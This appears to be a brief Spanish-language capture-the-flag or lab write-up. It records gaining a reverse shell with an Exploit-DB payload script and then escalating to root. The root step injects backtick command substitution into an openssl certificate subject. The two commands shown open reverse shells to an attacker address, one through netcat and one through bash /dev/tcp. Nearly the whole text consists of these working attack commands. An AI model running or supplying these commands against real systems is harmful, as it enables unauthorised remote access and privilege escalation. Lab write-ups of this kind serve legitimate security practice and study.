
## Reverse Shell

Payload obtenido de: https://www.exploit-db.com/exploits/52149

```python
python3 payload.py http://10.0.14.35:8080 10.10.2.6 4444  
```

## Root

Funciona gracias a los backticks que se usan como command substitution.
```shell
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 1 -out shell.pem -subj "/CN=x\`nc\ -e\ \/bin\/bash\ 10.10.2.6\ 4446\`" # netcat

openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 1 -out shell.pem -subj "/CN=x\`bash\ -c\ \'exec\ bash\ >&\ \/dev\/tcp\/10.10.2.6\/4445\ 0>&1\ &\'\`" # Penelope
```
